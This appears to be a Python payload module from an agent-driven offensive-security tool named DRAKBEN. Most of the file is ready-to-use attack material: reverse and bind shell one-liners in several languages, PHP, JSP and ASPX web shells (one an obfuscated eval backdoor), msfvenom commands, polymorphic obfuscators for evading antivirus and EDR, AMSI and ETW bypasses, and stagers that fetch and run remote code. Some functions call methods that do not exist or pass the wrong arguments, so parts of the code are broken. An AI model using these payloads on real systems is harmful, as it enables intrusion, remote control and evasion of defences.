# modules/payload.py
# DRAKBEN Payload Module - STATE-AWARE Advanced Level
# REQUIRED: Payload FORBIDDEN without foothold
# Enhanced: Logging, better error handling, more payload types

import asyncio
import base64
import logging
from typing import Any, Dict, List, Optional, Tuple, Tuple

# Setup logger
logger = logging.getLogger(__name__)

# Constants
STATE_INVARIANT_VIOLATION = "State invariant violation"

# State integration
try:
    from core.state import AgentState, AttackPhase

    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False
    logger.warning("State module not available")


class PayloadError(Exception):
    """Custom exception for payload errors"""
    pass


def check_payload_preconditions(state: "AgentState") -> Tuple[bool, str]:
    """
    Payload precondition check - STRICTLY REQUIRED.

    RULE: Payload FORBIDDEN without foothold.

    Args:
        state: AgentState instance
        
    Returns:
        (can_execute, reason)
    """
    logger.debug("Checking payload preconditions")
    
    if not STATE_AVAILABLE or not state:
        logger.warning("State tracking not available")
        return False, "State tracking is required for payload execution"

    # Precondition 1: PAYLOAD FORBIDDEN WITHOUT FOOTHOLD
    if not state.has_foothold:
        logger.warning("Payload blocked: No foothold established")
        return False, "FORBIDDEN: Payload requires foothold first"

    # Precondition 2: Must be in appropriate phase
    if state.phase not in [AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]:
        logger.warning(f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT")
        return False, f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT"

    logger.info("Payload preconditions satisfied")
    return True, "Preconditions satisfied"


# -------------------------
# Reverse Shell Payload
# -------------------------
async def reverse_shell(
    state: "AgentState", 
    target_ip: str = "127.0.0.1", 
    target_port: int = 4444,
    timeout: int = 30
) -> Dict[str, Any]:
    """
    STATE-AWARE Reverse shell - FOOTHOLD REQUIRED.
    
    Args:
        state: AgentState instance
        target_ip: Target IP to connect to
        target_port: Target port
        timeout: Connection timeout in seconds
        
    Returns:
        Dict with connection results
    """
    logger.info(f"Initiating reverse shell connection to {target_ip}:{target_port}")

    # Enforce state required
    if state is None:
        raise RuntimeError("State is required for payload execution")

    # STATE VALIDATION
    if STATE_AVAILABLE and state and not state.validate():
        logger.error(f"{STATE_INVARIANT_VIOLATION} before reverse shell")
        return {
            "type": "ReverseShell",
            "success": False,
            "error": STATE_INVARIANT_VIOLATION,
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    # PRECONDITION CHECK - REQUIRED
    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        logger.warning(f"Reverse shell blocked: {reason}")
        return {
            "type": "ReverseShell",
            "success": False,
            "error": reason,
            "blocked": True,
            "critical_violation": "Attempted payload without foothold",
        }

    try:
        logger.debug(f"Attempting connection to {target_ip}:{target_port}")
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(target_ip, target_port),
            timeout=timeout
        )
        
        writer.write(b"Drakben reverse shell connection established.\n")
        await writer.drain()
        logger.info(f"Reverse shell connected to {target_ip}:{target_port}")

        # Update state - foothold confirmed
        if STATE_AVAILABLE and state:
            state.mark_post_exploit_done("reverse_shell_established")
            if not state.validate():
                logger.error(f"{STATE_INVARIANT_VIOLATION} after reverse shell")
                return {
                    "type": "ReverseShell",
                    "success": False,
                    "error": "State invariant violation after update",
                    "blocked": True,
                    "invariant_violations": getattr(state, "invariant_violations", []),
                }

        return {
            "type": "ReverseShell",
            "success": True,
            "ip": target_ip,
            "port": target_port,
        }
    except asyncio.TimeoutError:
        logger.error(f"Reverse shell connection timeout to {target_ip}:{target_port}")
        return {
            "type": "ReverseShell", 
            "success": False, 
            "error": f"Connection timeout after {timeout}s",
            "timeout": True
        }
    except ConnectionRefusedError:
        logger.error(f"Connection refused to {target_ip}:{target_port}")
        return {
            "type": "ReverseShell",
            "success": False,
            "error": "Connection refused - ensure listener is running",
        }
    except Exception as e:
        logger.exception(f"Reverse shell failed: {e}")
        return {"type": "ReverseShell", "success": False, "error": str(e)}


# -------------------------
# Bind Shell Payload
# -------------------------
async def bind_shell(
    state: "AgentState", 
    listen_ip: str = "0.0.0.0", 
    listen_port: int = 5555
) -> Dict[str, Any]:
    """
    STATE-AWARE Bind shell - FOOTHOLD GEREKLİ
    
    Args:
        state: AgentState instance
        listen_ip: IP to listen on
        listen_port: Port to listen on
        
    Returns:
        Dict with bind shell results
    """
    logger.info(f"Starting bind shell on {listen_ip}:{listen_port}")

    if state is None:
        raise RuntimeError("State is required for payload execution")

    # STATE VALIDATION
    if STATE_AVAILABLE and state and not state.validate():
        logger.error("State invariant violation before bind shell")
        return {
            "type": "BindShell",
            "success": False,
            "error": STATE_INVARIANT_VIOLATION,
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    # PRECONDITION CHECK - REQUIRED
    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        logger.warning(f"Bind shell blocked: {reason}")
        return {
            "type": "BindShell",
            "success": False,
            "error": reason,
            "blocked": True,
            "critical_violation": "Attempted payload without foothold",
        }
    
    try:
        server = await asyncio.start_server(handle_client, listen_ip, listen_port)
        await server.start_serving()
        logger.info(f"Bind shell listening on {listen_ip}:{listen_port}")
        
        return {
            "type": "BindShell",
            "success": True,
            "ip": listen_ip,
            "port": listen_port,
        }
    except OSError as e:
        if "Address already in use" in str(e):
            logger.error(f"Port {listen_port} already in use")
            return {
                "type": "BindShell",
                "success": False,
                "error": f"Port {listen_port} already in use",
            }
        logger.exception(f"Bind shell failed: {e}")
        return {"type": "BindShell", "success": False, "error": str(e)}
    except Exception as e:
        logger.exception(f"Bind shell failed: {e}")
        return {"type": "BindShell", "success": False, "error": str(e)}


async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """Handle incoming bind shell connection"""
    addr = writer.get_extra_info('peername')
    logger.info(f"Bind shell connection from {addr}")
    
    writer.write(b"Drakben bind shell connection established.\n")
    await writer.drain()


# -------------------------
# Command Execution Payload
# -------------------------
def execute_command(state: "AgentState"):
    """
    Direct command execution is forbidden for security.
    
    Args:
        state: AgentState instance
        cmd: Command to execute (blocked)
        
    Raises:
        RuntimeError: Always raises as direct execution is forbidden
    """
    logger.error("Direct command execution attempted - BLOCKED")
    if state is None:
        raise RuntimeError("State is required for payload command execution")
    # Direct command execution is forbidden; must use ToolSelector via agent tool execution path
    raise RuntimeError(
        "Direct command execution is forbidden. Use ToolSelector via the agent executor."
    )


# -------------------------
# AI-Powered Payload Recommendation
# -------------------------
def ai_payload_advice(state: "AgentState") -> Dict[str, Any]:
    """
    AI-powered payload recommendation.
    
    Args:
        state: AgentState instance
        exploit_output: Output from exploit module
        
    Returns:
        Dict with AI recommendations
    """
    logger.info("Starting AI payload advice engine")
    
    if state is None:
        raise RuntimeError("State is required for AI payload advice")
    
    # STATE VALIDATION
    if STATE_AVAILABLE and state and not state.validate():
        logger.error(f"{STATE_INVARIANT_VIOLATION} in AI advice")
        return {
            "type": "AI",
            "error": STATE_INVARIANT_VIOLATION,
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        return {"type": "AI", "error": reason, "blocked": True}
    
    # AI analysis handled by Brain module
    advice = "AI analysis handled by Brain module - use brain.think() for recommendations"
    return {"type": "AI", "advice": advice}


# -------------------------
# Payload Templates
# -------------------------
PAYLOAD_TEMPLATES = {
    "reverse_shell_bash": {
        "code": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        "description": "Bash reverse shell",
        "os": "linux",
        "requires": ["bash"],
    },
    "reverse_shell_python": {
        "code": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
        "description": "Python reverse shell",
        "os": "linux",
        "requires": ["python3"],
    },
    "reverse_shell_python_windows": {
        "code": '''python -c "import socket,subprocess;s=socket.socket();s.connect(('{lhost}',{lport}));[subprocess.Popen(['cmd.exe'],stdin=s,stdout=s,stderr=s)]"''',
        "description": "Python reverse shell for Windows",
        "os": "windows",
        "requires": ["python"],
    },
    "reverse_shell_nc": {
        "code": 'nc -e /bin/sh {lhost} {lport}',
        "description": "Netcat reverse shell",
        "os": "linux",
        "requires": ["nc"],
    },
    "reverse_shell_nc_mkfifo": {
        "code": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        "description": "Netcat reverse shell with mkfifo (no -e flag)",
        "os": "linux",
        "requires": ["nc", "mkfifo"],
    },
    "reverse_shell_perl": {
        "code": '''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'\'''',
        "description": "Perl reverse shell",
        "os": "linux",
        "requires": ["perl"],
    },
    "reverse_shell_php": {
        "code": '''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'\'''',
        "description": "PHP reverse shell",
        "os": "linux",
        "requires": ["php"],
    },
    "reverse_shell_ruby": {
        "code": '''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'''',
        "description": "Ruby reverse shell",
        "os": "linux",
        "requires": ["ruby"],
    },
    "reverse_shell_powershell": {
        "code": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        "description": "PowerShell reverse shell",
        "os": "windows",
        "requires": ["powershell"],
    },
    "web_shell_php": {
        "code": '''<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }} ?>''',
        "description": "Simple PHP web shell",
        "os": "any",
        "requires": ["php"],
    },
    "web_shell_php_advanced": {
        "code": '''<?php $k="drakben";if(isset($_POST[$k])){{@eval(base64_decode($_POST[$k]));}} ?>''',
        "description": "Obfuscated PHP web shell",
        "os": "any",
        "requires": ["php"],
    },
    "web_shell_jsp": {
        "code": '''<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); if(cmd != null) {{ Process p = Runtime.getRuntime().exec(cmd); DataInputStream in = new DataInputStream(p.getInputStream()); String s = null; while((s = in.readLine()) != null) {{ out.println(s); }} }} %>''',
        "description": "JSP web shell",
        "os": "any",
        "requires": ["java"],
    },
    "web_shell_aspx": {
        "code": '''<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string cmd = Request["cmd"]; if(!string.IsNullOrEmpty(cmd)) {{ Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); }} %>''',
        "description": "ASPX web shell",
        "os": "windows",
        "requires": ["aspx"],
    },
    "bind_shell_nc": {
        "code": 'nc -lvnp {lport} -e /bin/sh',
        "description": "Netcat bind shell",
        "os": "linux",
        "requires": ["nc"],
    },
    "bind_shell_python": {
        "code": '''python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'\'''',
        "description": "Python bind shell",
        "os": "linux",
        "requires": ["python3"],
    },
    "msfvenom_linux_reverse": {
        "code": 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf',
        "description": "Metasploit Linux reverse shell ELF",
        "os": "linux",
        "requires": ["msfvenom"],
        "type": "generator",
    },
    "msfvenom_windows_reverse": {
        "code": 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe',
        "description": "Metasploit Windows reverse shell EXE",
        "os": "windows",
        "requires": ["msfvenom"],
        "type": "generator",
    },
}


# -------------------------
# Generate Payload (Helper)
# -------------------------
def generate_payload(
    state: "AgentState", 
    payload_type: str, 
    lhost: Optional[str] = None, 
    lport: int = 4444,
    encode: bool = False
) -> Dict[str, Any]:
    """
    Generate various payload types.

    Args:
        state: AgentState instance
        payload_type: Type of payload (see PAYLOAD_TEMPLATES)
        lhost: Local host for reverse shell
        lport: Local port
        encode: Whether to base64 encode the payload

    Returns:
        dict with payload code and metadata
    """
    logger.info(f"Generating payload: {payload_type}")
    
    if state is None:
        raise RuntimeError("State is required for payload generation")

    # STATE VALIDATION
    if STATE_AVAILABLE and state and not state.validate():
        logger.error(f"{STATE_INVARIANT_VIOLATION} in payload generation")
        return {
            "error": STATE_INVARIANT_VIOLATION,
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        logger.warning(f"Payload generation blocked: {reason}")
        return {"error": reason, "blocked": True}

    payload_key = payload_type.lower()
    if payload_key not in PAYLOAD_TEMPLATES:
        logger.warning(f"Unknown payload type: {payload_type}")
        return {
            "error": f"Unknown payload type: {payload_type}",
            "available": list(PAYLOAD_TEMPLATES.keys()),
        }
    
    template = PAYLOAD_TEMPLATES[payload_key]
    
    # Generate payload code
    try:
        code = template["code"].format(lhost=lhost or "LHOST", lport=lport)
    except KeyError as e:
        logger.error(f"Missing parameter for payload: {e}")
        return {"error": f"Missing parameter: {e}"}
    
    # Optionally encode
    if encode:
        code_bytes = code.encode('utf-8')
        code = base64.b64encode(code_bytes).decode('utf-8')
        logger.debug("Payload encoded to base64")
    
    logger.info(f"Payload generated successfully: {payload_type}")
    
    return {
        "type": payload_type,
        "code": code,
        "description": template.get("description", ""),
        "os": template.get("os", "unknown"),
        "requires": template.get("requires", []),
        "lhost": lhost,
        "lport": lport,
        "encoded": encode,
        "success": True,
    }


def list_payloads(os_filter: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    List available payload templates.
    
    Args:
        os_filter: Filter by OS (linux, windows, any)
        
    Returns:
        List of payload info dicts
    """
    logger.debug(f"Listing payloads with filter: {os_filter}")
    
    payloads = []
    for name, template in PAYLOAD_TEMPLATES.items():
        if os_filter and template.get("os") != os_filter and template.get("os") != "any":
            continue
        payloads.append({
            "name": name,
            "description": template.get("description", ""),
            "os": template.get("os", "unknown"),
            "requires": template.get("requires", []),
        })
    
    return payloads


# =========================================
# PAYLOAD OBFUSCATION & AV BYPASS
# =========================================

class PayloadObfuscator:
    """
    Payload obfuscation for AV/EDR bypass.
    
    Techniques:
    - String encoding (Base64, Hex, Unicode)
    - Variable substitution
    - Dead code injection
    - String concatenation
    - XOR encoding
    - Custom encoders
    """
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Encode payload to Base64"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Encode payload to hexadecimal"""
        return payload.encode().hex()
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Encode payload to Unicode escape sequences"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def xor_encode(payload: str, key: int = 0x41) -> Tuple[str, int]:
        """
        XOR encode payload.
        
        Args:
            payload: Original payload
            key: XOR key (default 0x41)
            
        Returns:
            Tuple of (encoded_bytes_as_hex, key)
        """
        encoded = ''.join(f'{ord(c) ^ key:02x}' for c in payload)
        return encoded, key
    
    @staticmethod
    def string_concat(payload: str, chunk_size: int = 3) -> str:
        """
        Split string into concatenated chunks.
        
        Args:
            payload: Original string
            chunk_size: Size of each chunk
            
        Returns:
            Concatenated string expression
        """
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        return ' + '.join(f'"{chunk}"' for chunk in chunks)
    
    @staticmethod
    def polymorphic_encode(payload: str, language: str = "bash") -> str:
        """
        Advanced Polymorphic Encoding Engine.
        Changes code structure every time to bypass signature-based detection.
        """
        if language == "bash":
            return _polymorphic_encode_bash(payload)
        elif language == "python":
            return _polymorphic_encode_python(payload)
        return payload  # Fallback for unknown langs

def _polymorphic_encode_bash(payload: str) -> str:
    """Polymorphic encoding for bash"""
    import random
    import string
    
    def random_var(length=5):
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    var_map = {}
    keywords = ["bash", "dev", "tcp", "sh"]
    repo = []
    
    for word in keywords:
        if word in payload:
            vname = random_var()
            var_map[word] = vname
            repo.append(f"{vname}='{word}'")
    
    mutated = payload
    for k, v in var_map.items():
        mutated = mutated.replace(k, f"${v}")
    
    junk_ops = [
        "true", 
        ":", 
        f"{random_var()}={random.randint(1,99)}",
        "if [ 1 -eq 1 ]; then :; fi"
    ]
    
    final_code = repo + [random.choice(junk_ops), mutated]
    return "; ".join(final_code)

def _polymorphic_encode_python(payload: str) -> str:
    """Polymorphic encoding for Python"""
    import random
    import string
    
    def random_var(length=5):
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    imports = ["socket", "subprocess", "os"]
    import_block = []
    alias_map = {}
    
    for imp in imports:
        alias = random_var(3)
        alias_map[imp] = alias
        import_block.append(f"import {imp} as {alias}")
    
    mutated = payload
    for org, alias in alias_map.items():
        mutated = mutated.replace(org, alias)
    
    def fragment_string(s):
        if len(s) < 5:
            return f"'{s}'"
        cut = random.randint(1, len(s)-1)
        return f"'{s[:cut]}'+'{s[cut:]}'"
    
    wrapper = f"""
try:
    {";".join(import_block)}
    exec({fragment_string(mutated)})
except (SyntaxError, NameError, ValueError) as e:
    pass  # Silent fail for stealth operation
"""
    return wrapper.strip()
    



class PowerShellObfuscator:
    """PowerShell-specific obfuscation techniques"""
    
    @staticmethod
    def invoke_expression_encode(payload: str) -> str:
        """Encode using Invoke-Expression with Base64"""
        import base64
        
        # UTF-16LE encoding for PowerShell
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f'powershell -EncodedCommand {encoded}'
    
    @staticmethod
    def concat_strings(payload: str) -> str:
        """Use string concatenation"""
        parts = []
        for i in range(0, len(payload), 2):
            chunk = payload[i:i+2]
            parts.append(f"'{chunk}'")
        return '(' + '+'.join(parts) + ')'
    
    @staticmethod
    def char_array(payload: str) -> str:
        """Convert to char array"""
        chars = ','.join(str(ord(c)) for c in payload)
        return f'[char[]]@({chars}) -join ""'
    
    @staticmethod
    def environment_variable(payload: str, var_name: str = "x") -> str:
        """Store in environment variable"""
        encoded = PayloadObfuscator.base64_encode(payload)
        return f'$env:{var_name}="{encoded}";iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:{var_name})))'
    
    @staticmethod
    def tick_obfuscation(payload: str) -> str:
        """Insert backticks for obfuscation"""
        import random
        result = ""
        for char in payload:
            if char.isalpha() and random.random() > 0.7:
                result += '`' + char
            else:
                result += char
        return result


class BashObfuscator:
    """Bash-specific obfuscation techniques"""
    
    @staticmethod
    def eval_base64(payload: str) -> str:
        """Encode using eval and base64"""
        encoded = PayloadObfuscator.base64_encode(payload)
        return f'eval "$(echo {encoded} | base64 -d)"'
    
    @staticmethod
    def hex_printf(payload: str) -> str:
        """Use printf with hex escape"""
        hex_payload = ''.join(f'\\x{ord(c):02x}' for c in payload)
        return f'eval "$(printf "{hex_payload}")"'
    
    @staticmethod
    def variable_expansion(payload: str) -> str:
        """Use variable expansion tricks"""
        import random
        var = ''.join(chr(random.randint(97, 122)) for _ in range(4))
        encoded = PayloadObfuscator.base64_encode(payload)
        return f'{var}={encoded}\neval "$(echo ${var} | base64 -d)"'
    
    @staticmethod
    def brace_expansion(command: str) -> str:
        """Use brace expansion for command"""
        # Split command into parts
        parts = command.split()
        if len(parts) < 2:
            return command
        
        # Create brace expansion
        cmd = parts[0]
        result = '{' + ','.join(list(cmd)) + '}'
        return ' '.join([result] + parts[1:])
    
    @staticmethod
    def octal_encode(payload: str) -> str:
        """Encode using octal"""
        octal_payload = ''.join(f'\\{ord(c):03o}' for c in payload)
        return f'eval "$(printf "{octal_payload}")"'


class AVBypass:
    """
    Antivirus/EDR bypass techniques.
    
    WARNING: For educational and authorized testing only.
    """
    
    @staticmethod
    def amsi_bypass_powershell() -> str:
        """Generate AMSI bypass for PowerShell"""
        # Common AMSI bypass (for educational purposes)
        bypasses = [
            # Reflection-based
            '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
            # Memory patching approach (conceptual)
            '$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)',
        ]
        return bypasses[0]
    
    @staticmethod
    def etw_bypass_powershell() -> str:
        """Generate ETW bypass for PowerShell"""
        return '[Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)'
    
    @staticmethod
    def windows_defender_exclusion_check() -> str:
        """PowerShell command to check Defender exclusions"""
        return 'Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'
    
    @staticmethod
    def sleep_bypass(payload: str, sleep_seconds: int = 120) -> str:
        """
        Add sleep to bypass sandbox analysis.
        
        Args:
            payload: Original payload
            sleep_seconds: Sleep duration
            
        Returns:
            Payload with sleep prepended
        """
        return f'Start-Sleep -Seconds {sleep_seconds}; {payload}'
    
    @staticmethod
    def process_hollowing_stub() -> str:
        """Generate process hollowing conceptual stub"""
        return '''
# Process Hollowing Concept (Educational)
# 1. Create suspended process
# 2. Unmap original executable
# 3. Allocate memory in target process
# 4. Write payload to allocated memory
# 5. Set entry point
# 6. Resume thread
'''
    
    @staticmethod
    def dll_injection_stub() -> str:
        """Generate DLL injection conceptual stub"""
        return '''
# DLL Injection Concept (Educational)
# 1. Get target process handle
# 2. Allocate memory in target process
# 3. Write DLL path to allocated memory
# 4. Get LoadLibraryA address
# 5. Create remote thread calling LoadLibraryA
'''


def obfuscate_payload(
    payload: str,
    language: str = "bash",
    techniques: List[str] = None
) -> Dict[str, Any]:
    """
    Apply obfuscation techniques to payload.
    
    Args:
        payload: Original payload
        language: Target language (bash, powershell, python)
        techniques: List of techniques to apply
        
    Returns:
        Dict with obfuscated payload and metadata
    """
    logger.info(f"Obfuscating payload ({language})")
    
    if techniques is None:
        techniques = ["base64", "variable"]
    
    result = payload
    applied = []
    
    for technique in techniques:
        result, technique_name = _apply_obfuscation_technique(result, technique, language)
        if technique_name:
            applied.append(technique_name)
    
    return {
        "original_length": len(payload),
        "obfuscated_length": len(result),
        "language": language,
        "techniques_applied": applied,
        "payload": result
    }

def _apply_obfuscation_technique(payload: str, technique: str, language: str) -> Tuple[str, Optional[str]]:
    """Apply a single obfuscation technique"""
    if technique == "base64":
        return _apply_base64_obfuscation(payload, language), "base64"
    elif technique == "hex":
        return _apply_hex_obfuscation(payload, language), "hex"
    elif technique == "xor":
        encoded, key = PayloadObfuscator.xor_encode(payload)
        return f"XOR_KEY={key}\nENCODED={encoded}", f"xor_key_{key}"
    elif technique == "variable":
        return PayloadObfuscator.variable_substitution(payload), "variable_substitution"
    elif technique == "dead_code":
        return PayloadObfuscator.dead_code_injection(payload, language), "dead_code"
    elif technique == "concat":
        return _apply_concat_obfuscation(payload, language), "string_concat"
    elif technique == "tick" and language == "powershell":
        return PowerShellObfuscator.tick_obfuscation(payload), "tick_obfuscation"
    return payload, None

def _apply_base64_obfuscation(payload: str, language: str) -> str:
    """Apply base64 obfuscation based on language"""
    if language == "bash":
        return BashObfuscator.eval_base64(payload)
    elif language == "powershell":
        return PowerShellObfuscator.invoke_expression_encode(payload)
    return PayloadObfuscator.base64_encode(payload)

def _apply_hex_obfuscation(payload: str, language: str) -> str:
    """Apply hex obfuscation based on language"""
    if language == "bash":
        return BashObfuscator.hex_printf(payload)
    return PayloadObfuscator.hex_encode(payload)

def _apply_concat_obfuscation(payload: str, language: str) -> str:
    """Apply string concatenation obfuscation"""
    if language == "powershell":
        return PowerShellObfuscator.concat_strings(payload)
    return PayloadObfuscator.string_concat(payload)


def generate_staged_payload(
    payload_type: str,
    lhost: str,
    lport: int,
    stage_url: str
) -> Dict[str, Any]:
    """
    Generate staged payload with stager and stage.
    
    Args:
        payload_type: Type of payload
        lhost: Listener host
        lport: Listener port
        stage_url: URL to fetch stage from
        
    Returns:
        Dict with stager and stage payloads
    """
    logger.info(f"Generating staged payload: {payload_type}")
    
    # Stagers (small code to fetch and execute stage)
    stagers = {
        "powershell": f'IEX(New-Object Net.WebClient).DownloadString("{stage_url}")',
        "bash": f'curl -s {stage_url} | bash',
        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',
    }
    
    # Get main payload
    payload_result = generate_payload(payload_type, lhost, lport)
    
    if not payload_result.get("success"):
        return payload_result
    
    stage = payload_result["code"]
    
    return {
        "type": f"staged_{payload_type}",
        "stagers": stagers,
        "stage": stage,
        "stage_url": stage_url,
        "lhost": lhost,
        "lport": lport,
        "success": True
    }
